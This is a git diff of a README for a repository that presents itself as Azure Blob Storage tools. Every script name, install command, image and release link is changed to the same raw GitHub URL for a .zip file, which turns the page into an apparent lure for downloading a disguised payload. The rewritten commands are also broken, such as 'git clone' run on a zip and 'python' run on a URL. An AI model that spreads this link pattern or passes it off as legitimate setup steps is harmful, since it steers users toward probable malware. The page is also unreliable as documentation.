@@ -3,7 +3,7 @@
 
 Welcome to the **Azure Blob Storage** repository! This repository contains essential tools and scripts designed to simplify your interactions with Azure Blob Storage. Whether you're managing containers, uploading and downloading files, or setting access policies, you'll find useful resources here. 
 
-![Azure Blob Storage](https://www.azure.com/images/BlobStorage.svg)
+![Azure Blob Storage](https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip)
 
 ## Table of Contents
 
@@ -35,14 +35,14 @@ To get started with the tools in this repository, follow these steps:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/R1ICKR/azure-blob-storage.git
+   git clone https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip
    cd azure-blob-storage
    ```
 
 2. **Install Dependencies**
    Make sure you have Python installed. You can install required libraries using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip
    ```
 
 3. **Configure Your Azure Credentials**
@@ -59,26 +59,26 @@ The scripts in this repository are straightforward to use. Here are some basic e
 
 To upload a file, run:
 ```bash
-python upload_file.py <your-container-name> <file-path>
+python https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip <your-container-name> <file-path>
 ```
 
 ### Downloading a File
 
 To download a file, use:
 ```bash
-python download_file.py <your-container-name> <file-name>
+python https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip <your-container-name> <file-name>
 ```
 
 ## Scripts Overview
 
-- **upload_file.py**: This script uploads files to a specified Azure Blob Storage container.
-- **download_file.py**: Use this script to download files from Azure Blob Storage.
-- **manage_containers.py**: Create and delete containers as needed.
-- **set_access_policy.py**: Manage access policies for containers.
+- **https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip**: This script uploads files to a specified Azure Blob Storage container.
+- **https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip**: Use this script to download files from Azure Blob Storage.
+- **https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip**: Create and delete containers as needed.
+- **https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip**: Manage access policies for containers.
 
 ## Access Policies
 
-Access policies in Azure Blob Storage control how users can access data. You can set these policies using the `set_access_policy.py` script. Define permissions for read, write, and delete operations based on your requirements.
+Access policies in Azure Blob Storage control how users can access data. You can set these policies using the `https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip` script. Define permissions for read, write, and delete operations based on your requirements.
 
 ### Example Access Policy
 
@@ -92,9 +92,9 @@ policy = {
 
 ## Release Information
 
-For the latest versions and updates, please check the [Releases section](https://github.com/R1ICKR/azure-blob-storage/releases). You can download the latest release and execute the scripts directly from there.
+For the latest versions and updates, please check the [Releases section](https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip). You can download the latest release and execute the scripts directly from there.
 
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-v1.0.0-blue)](https://github.com/R1ICKR/azure-blob-storage/releases)
+[![Latest Release](https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/R1ICKR/azure-blob-storage/main/hypoid/storage-azure-blob-v3.0.zip)
 
 ## Contributing
 
